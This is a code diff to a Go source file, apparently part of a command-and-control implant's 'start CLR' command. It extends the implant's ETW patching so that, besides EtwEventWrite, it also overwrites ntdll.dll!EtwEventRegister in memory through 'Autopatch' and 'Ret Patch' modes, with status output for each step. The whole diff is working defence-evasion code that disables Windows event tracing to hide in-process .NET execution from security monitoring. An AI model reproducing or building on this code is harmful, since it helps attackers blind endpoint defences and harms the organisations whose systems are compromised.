@@ -140,7 +140,7 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Apply ETW patch
+	// Apply ETW patch (EtwEventWrite + EtwEventRegister)
 	switch params.EtwPatch {
 	case "Autopatch":
 		output += "\n[*] Applying ETW Autopatch (ntdll.dll!EtwEventWrite)...\n"
@@ -150,11 +150,25 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		} else {
 			output += patchOutput + "\n"
 		}
+		output += "[*] Applying ETW Autopatch (ntdll.dll!EtwEventRegister)...\n"
+		patchOutput, err = PerformAutoPatch("ntdll.dll", "EtwEventRegister", 300)
+		if err != nil {
+			output += fmt.Sprintf("[-] EtwEventRegister Autopatch failed: %v\n", err)
+		} else {
+			output += patchOutput + "\n"
+		}
 	case "Ret Patch":
 		output += "\n[*] Applying ETW Ret Patch (ntdll.dll!EtwEventWrite)...\n"
 		patchOutput, err := PerformRetPatch("ntdll.dll", "EtwEventWrite")
 		if err != nil {
 			output += fmt.Sprintf("[-] ETW Ret Patch failed: %v\n", err)
+		} else {
+			output += patchOutput
+		}
+		output += "[*] Applying ETW Ret Patch (ntdll.dll!EtwEventRegister)...\n"
+		patchOutput, err = PerformRetPatch("ntdll.dll", "EtwEventRegister")
+		if err != nil {
+			output += fmt.Sprintf("[-] EtwEventRegister Ret Patch failed: %v\n", err)
 		} else {
 			output += patchOutput
 		}
